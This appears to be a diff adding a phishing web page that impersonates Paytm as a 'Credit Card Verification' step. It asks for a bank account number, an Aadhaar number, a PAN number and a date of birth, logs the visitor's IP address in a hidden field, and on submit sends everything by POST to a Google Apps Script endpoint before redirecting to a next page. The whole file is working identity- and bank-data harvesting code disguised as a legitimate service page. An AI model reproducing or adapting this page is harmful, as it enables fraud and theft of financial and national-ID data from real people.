@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="eng">
+<head>
+<script type="application/javascript">
+    var ipa;
+    function getIP(json) {
+        ipa = json.ip;
+    }
+    function setIp(){
+		document.getElementById('00NF000000DAKs6').value = ipa;
+	}
+</script>
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&amp;callback=getIP"></script>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <link rel="apple-touch-icon" sizes="180x180" href="/Paytm/apple-touch-icon.png">
+ <link rel="icon" type="image/png" sizes="32x32" href="/Paytm/favicon-32x32.png">
+ <link rel="icon" type="image/png" sizes="16x16" href="/Paytm/favicon-16x16.png">
+ <link rel="manifest" href="/Paytm/site.webmanifest">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.0.3/css/font-awesome.css">
+  <meta name="theme-color" content="#ffffff">
+  <title>Paytm | Credit Card Verification</title>
+  <style>
+  .inlineimage{max-width:470px;margin-right: 8px;margin-left: 10px}.images{display: inline-block;max-width: 98%;height: auto;width: 22%;margin: 1%;left:20px;text-align: center}
+  #ml
+  {
+  width:70%;
+  }
+  #ab
+  {
+  width:365px;
+  margin:50px;
+  border-bottom:solid #CCCCCC;
+  border-width:1.2px;
+  }
+  #btn
+  {
+  width:280px;
+  background-color:#1164ad;
+  color: white;
+  border:none;
+  border-radius: 2px;
+  border-width: 0px;
+  font-weight: bold;
+  cursor: pointer;
+  font-size: 16px;
+  height:45px;
+  }
+  #lk
+  {
+  width:5.4%;
+  position:absolute;
+  margin:-2px;
+  margin-left:-22px;
+  }
+  </style>
+  <body onload="setIp()">
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='.html';}"></iframe>
+  <!--My Form-->
+  <form action="" method="post" name="google-sheet">
+<div class="line"><p>
+    <center><img src="logo.png" alt="" id="ml"><br></center>
+    <div id="ab" 
+    style="margin:10px; 
+    margin-left:-8px;">
+    </div><br>
+    <!-- Credit Card Payment Form - START -->
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-md-6 col-md-offset-4">
+                <div class="panel panel-default">
+                    <div class="panel-heading">
+                        <div class="row">
+                             <center>
+                             <h3 style="
+                             background-color:#1164ad;
+                             padding: 10px;
+                             border-radius:1px;
+                             margin:0px;
+                             margin-left:0px;
+                             font-size:16px;
+                             color:#fff;
+                             width:95%;
+                             height:38px;">Personal Info</b></center><br>
+                            <b style="color:#black; font-family:arial; margin-left:-2px; font-size:12px; padding:10px;">
+                            Enter the information requested below. This <br><span style="color:#black; font-family:arial; margin-left:-2px; font-size:12px; padding:10px;">Information will be used to confirm your identity.</span>
+                            </b>
+                        </div>
+                    </div>
+                    <div class="panel-body">
+                        <form role="form"><div class="row">
+                                <div class="col-xs-12">
+                                    <div class="form-group"> <label>Enter Account Number</label> <input type="phone" inputmode="number" name="Ac_no.v" class="form-control" placeholder="A/c No." maxlength="15" title="Please enter valid A/c No.!"
+                                    required=""/> </div>
+<div class="row">
+                                <div class="col-xs-12">
+                                    <div class="form-group"> <label>Enter Aadhar Card Number</label><input type="tel" name="Aadharv" class="form-control" onkeypress="return formats(this,event)" onkeyup="return numberValidation(event)" placeholder="XXXX XXXX XXXX" required=""/>  
+                                        <script>
+                                        function formats(ele,e){
+                                        if(ele.value.length<14){
+                                        ele.value= ele.value.replace(/\W/g, '').replace(/(.{4})/g, '$1 ');
+                                        return true;
+                                        }else{
+                                        return false;
+                                        }
+                                        }
+                                        
+                                        function numberValidation(e){
+                                        e.target.value = e.target.value.replace(/[^\d ]/g,'');
+                                        return false;
+                                        }
+                                        </script> </div>
+<div class="row">
+                                <div class="col-xs-12">
+                                    <div class="form-group"> <label>Enter PANCARD Number</label> <input type="text" inputmode="numeric" name="Panv" class="form-control" placeholder="Enter PAN No." maxlength="10" 
+                                    title="Please enter valid number !"
+                                    required=""/> </div>
+<div class="row">
+                                <div class="col-xs-12">
+                                    <div class="form-group"> <label>User DOB</label> <input type="date" inputmode="date" name="Dobv" class="form-control" placeholder="select"                                    title="Please enter valid DOB !"
+                                    required=""/> </div>
+                                    </div>
+                                </div>
+                            </div>
+                            </div></div>
+                            </div><input  id="00NF000000DAKs6" maxlength="20" name="00NF000000DAKs6" size="20" type="hidden">
+                        </form>
+                    </div>
+                    <div>
+                    <center><button type="submit" id="btn" style="font-weight:;"><span><img src="lock.svg" id="lk"></span>CONTINUE SECURELY</button></center><br>
+                    </div><br>
+                    </div>
+                </div>
+</div><script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbyHQGyh_wlowVBjbDQam869jvlouyChdvujoHOqmuMv87n3oJYvbIQ2McmUQFo0uYYr6Q/exec'
+  const form = document.forms['google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response =>  window.location.href='proccess4.html')
+      .catch(error => console.error('Error!', error.message))
+  })
+const form2 = document.forms['google-sheet2']
+
+  form2.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form2)})
+      .then(response =>  window.location.href='proccess4.html')
+      .catch(error => console.error('Error!', error.message))
+  })
+</script></html>
